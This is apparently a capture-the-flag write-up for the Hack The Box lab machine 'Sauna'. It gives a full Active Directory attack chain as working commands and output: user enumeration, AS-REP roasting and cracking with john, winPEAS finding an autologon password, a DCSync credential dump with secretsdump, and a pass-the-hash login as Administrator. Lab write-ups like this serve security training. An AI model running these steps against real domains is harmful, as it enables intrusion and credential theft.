# sauna: https://app.hackthebox.com/machines/Sauna

```bash
nmap -sC -sV 10.10.10.175       
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 08:20 EDT
Nmap scan report for 10.10.10.175
Host is up (0.14s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-16 19:21:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
dig ANY  @10.10.10.175 EGOTISTICAL-BANK.LOCAL

; <<>> DiG 9.18.12-1-Debian <<>> ANY @10.10.10.175 EGOTISTICAL-BANK.LOCAL
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29946
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;EGOTISTICAL-BANK.LOCAL.		IN	ANY

;; ANSWER SECTION:
EGOTISTICAL-BANK.LOCAL.	600	IN	A	10.10.10.175
EGOTISTICAL-BANK.LOCAL.	3600	IN	NS	sauna.EGOTISTICAL-BANK.LOCAL.
EGOTISTICAL-BANK.LOCAL.	3600	IN	SOA	sauna.EGOTISTICAL-BANK.LOCAL. hostmaster.EGOTISTICAL-BANK.LOCAL. 48 900 600 86400 3600
EGOTISTICAL-BANK.LOCAL.	600	IN	AAAA	dead:beef::d82a:5af8:762a:f639

;; ADDITIONAL SECTION:
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN	A	10.10.10.175
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN	AAAA	dead:beef::80f8:a40a:d4ea:8f03
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN	AAAA	dead:beef::1cd
```

```bash
cat /etc/hosts | grep 10.10.10.175
10.10.10.175	EGOTISTICAL-BANK.LOCAL egotistical-bank.local sauna.EGOTISTICAL-BANK.LOCAL hostmaster.EGOTISTICAL-BANK.LOCAL
```

```bash
http://10.10.10.175/about.html

cat usernames                               
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb

sudo git clone https://github.com/urbanadventurer/username-anarchy.git
Cloning into 'username-anarchy'...
remote: Enumerating objects: 386, done.
remote: Total 386 (delta 0), reused 0 (delta 0), pack-reused 386
Resolving deltas: 100% (127/127), done.

/opt/username-anarchy/username-anarchy --input-file ./usernames > generated.usernames

less generated.usernames
fergus
fergussmith
fergus.smith
fergussm
fergsmit
ferguss
f.smith
```

```bash
/usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ./generated.usernames -format hashcat -outputfile hashes.asreproast

cat hashes.asreproast 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:21b77c169c4105f5494b371600072406$7351c3776c5c4725d34b8bc2c60c3198331ef4430fe135c5725bee3c88f4c1a638b31ef915ebe0ca261641363693247c554285d70640523ea2249202f570d0c7d3d68712df768035179efb40eb369b30b1a268fc7f9b992e688d902715bd8fed65d4b9e63653727c43fd1747865cf000db72a88d7e7aa1dfdb1a3e0ada53762d7fcdc3a322fb92869f75a60723ba3907ed384e4e68ee2e9e41fa66a626a8a34e2335637ce2f12ea89cf26fc25a739fc419398798b06cf633def392c5ff658db7c9610cd5a756bcdcc85765dac3c5fc860f2302ec29c87a2e50ccf90d1afbd3d18fa5a3808386ec8d923c6d57d90d35c68989f7f542194ff47f0647dbe8cf08af

john hashes.asreproast --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
```
```bash

evil-winrm -i EGOTISTICAL-BANK.LOCAL -u fsmith -p "Thestrokes23"

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith

*Evil-WinRM* PS C:\Users\FSmith\Documents> type ../Desktop/user.txt
e47d04c182ac3b7ef953928cc4108e7d

```

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> [Environment]::Is64BitOperatingSystem
True

wget https://github.com/carlospolop/PEASS-ng/releases/download/20230413-7f846812/winPEASx64.exe                               
‘winPEASx64.exe’ saved [2025984/2025984]
```

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEASx64.exe
Info: Uploading winPEASx64.exe to C:\Users\FSmith\Documents\winPEASx64.exe
                                                             
Data: 2701312 bytes of 2701312 bytes copied

Info: Upload successful!
```

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe

.
.Snipped
.

Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
.
.Snipped
.
 Computer Name           :   SAUNA
   User Name               :   svc_loanmgr
   User Id                 :   1108
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/24/2020 4:48:31 PM

 .
 .Snipped
 .
```

```bash
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 17S
```

```bash
sudo neo4j console                              
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.

```

```bash
zip EGOTISTICAL-BANK.zip *.json

  adding: 20230416094221_computers.json (deflated 76%)
  adding: 20230416094221_containers.json (deflated 93%)
  adding: 20230416094221_domains.json (deflated 79%)
  adding: 20230416094221_gpos.json (deflated 91%)
  adding: 20230416094221_groups.json (deflated 94%)
  adding: 20230416094221_ous.json (deflated 65%)
  adding: 20230416094221_users.json (deflated 92%)
```
```bash
bloodhound

#right click on user SVC_LOANMGR and click help reveals the info below

The user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL.

These two privileges allow a principal to perform a DCSync attack.

```

```bash
impacket-secretsdump -just-dc SVC_LOANMGR:'Moneymakestheworldgoround!'@10.10.10.175 -just-dc-user Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
```

```bash
evil-winrm -i EGOTISTICAL-BANK.LOCAL -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
7c8dd4dbf1875a37550e3c091ad2a802
```
***References*** <br>
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns> <br>
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88> <br>
<https://github.com/carlospolop/PEASS-ng/tree/master> <br>
<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync> <br>
<> <br>
<> <br>
